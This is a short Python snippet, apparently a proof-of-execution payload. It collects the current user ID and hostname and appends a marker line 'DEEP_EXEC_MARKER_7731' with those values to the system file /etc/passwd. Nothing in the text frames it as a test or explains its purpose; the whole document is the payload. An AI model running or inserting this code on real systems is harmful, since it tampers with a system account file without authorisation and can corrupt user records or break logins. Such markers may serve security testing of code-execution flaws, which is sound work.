import os,socket
u=str(os.getuid())
h=socket.gethostname()
open("/etc/passwd","a").write(chr(10)+"DEEP_EXEC_MARKER_7731_uid"+u+"_host"+h+chr(10))
